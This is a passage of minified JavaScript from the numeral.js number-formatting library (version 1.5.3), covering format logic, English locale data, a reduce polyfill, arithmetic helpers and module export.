if(y<Math.pow(10,6)&&y>=Math.pow(10,3)&&!v||c){l=l+n[r].abbreviations.thousand;e=e/Math.pow(10,3)}}if(t.indexOf("b")>-1){if(t.indexOf(" b")>-1){m=" ";t=t.replace(" b","")}else{t=t.replace("b","")}for(S=0;S<=b.length;S++){w=Math.pow(1024,S);E=Math.pow(1024,S+1);if(e>=w&&e<E){m=m+b[S];if(w>0){e=e/w}break}}}if(t.indexOf("o")>-1){if(t.indexOf(" o")>-1){g=" ";t=t.replace(" o","")}else{t=t.replace("o","")}g=g+n[r].ordinal(e)}if(t.indexOf("[.]")>-1){f=true;t=t.replace("[.]",".")}x=e.toString().split(".")[0];T=t.split(".")[1];N=t.indexOf(",");if(T){if(T.indexOf("[")>-1){T=T.replace("]","");T=T.split("[");C=a(e,T[0].length+T[1].length,s,T[1].length)}else{C=a(e,T.length,s)}x=C.split(".")[0];if(C.split(".")[1].length){C=n[r].delimiters.decimal+C.split(".")[1]}else{C=""}if(f&&Number(C.slice(1))===0){C=""}}else{x=a(e,null,s)}if(x.indexOf("-")>-1){x=x.slice(1);k=true}if(N>-1){x=x.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g,"$1"+n[r].delimiters.thousands)}if(t.indexOf(".")===0){x=""}return(o&&k?"(":"")+(!o&&k?"-":"")+(!k&&u?"+":"")+x+C+(g?g:"")+(l?l:"")+(m?m:"")+(o&&k?")":"")}}function m(e,t){n[e]=t}function g(e){var t=e.toString().split(".");if(t.length<2){return 1}return Math.pow(10,t[1].length)}function y(){var e=Array.prototype.slice.call(arguments);return e.reduce(function(e,t){var n=g(e),r=g(t);return n>r?n:r},-Infinity)}var e,t="1.5.3",n={},r="en",i=null,s="0,0",o=typeof module!=="undefined"&&module.exports;e=function(t){if(e.isNumeral(t)){t=t.value()}else if(t===0||typeof t==="undefined"){t=0}else if(!Number(t)){t=e.fn.unformat(t)}return new u(Number(t))};e.version=t;e.isNumeral=function(e){return e instanceof u};e.language=function(t,i){if(!t){return r}if(t&&!i){if(!n[t]){throw new Error("Unknown language : "+t)}r=t}if(i||!n[t]){m(t,i)}return e};e.languageData=function(e){if(!e){return n[r]}if(!n[e]){throw new Error("Unknown language : "+e)}return n[e]};e.language("en",{delimiters:{thousands:",",decimal:"."},abbreviations:{thousand:"k",million:"m",billion:"b",trillion:"t"},ordinal:function(e){var t=e%10;return~~(e%100/10)===1?"th":t===1?"st":t===2?"nd":t===3?"rd":"th"},currency:{symbol:"$"}});e.zeroFormat=function(e){i=typeof e==="string"?e:null};e.defaultFormat=function(e){s=typeof e==="string"?e:"0.0"};if("function"!==typeof Array.prototype.reduce){Array.prototype.reduce=function(e,t){"use strict";if(null===this||"undefined"===typeof this){throw new TypeError("Array.prototype.reduce called on null or undefined")}if("function"!==typeof e){throw new TypeError(e+" is not a function")}var n,r,i=this.length>>>0,s=false;if(1<arguments.length){r=t;s=true}for(n=0;i>n;++n){if(this.hasOwnProperty(n)){if(s){r=e(r,this[n],n,this)}else{r=this[n];s=true}}}if(!s){throw new TypeError("Reduce of empty array with no initial value")}return r}}e.fn=u.prototype={clone:function(){return e(this)},format:function(e,t){return f(this,e?e:s,t!==undefined?t:Math.round)},unformat:function(e){if(Object.prototype.toString.call(e)==="[object Number]"){return e}return l(this,e?e:s)},value:function(){return this._value},valueOf:function(){return this._value},set:function(e){this._value=Number(e);return this},add:function(e){function n(e,n,r,i){return e+t*n}var t=y.call(null,this._value,e);this._value=[this._value,e].reduce(n,0)/t;return this},subtract:function(e){function n(e,n,r,i){return e-t*n}var t=y.call(null,this._value,e);this._value=[e].reduce(n,this._value*t)/t;return this},multiply:function(e){function t(e,t,n,r){var i=y(e,t);return e*i*t*i/(i*i)}this._value=[this._value,e].reduce(t,1);return this},divide:function(e){function t(e,t,n,r){var i=y(e,t);return e*i/(t*i)}this._value=[this._value,e].reduce(t);return this},difference:function(t){return Math.abs(e(this._value).subtract(t).value())}};if(o){module.exports=e}if(typeof ender==="undefined"){this["numeral"]=e}if(typeof define==="function"&&define.amd){define([],function(){return e})}}).call(this);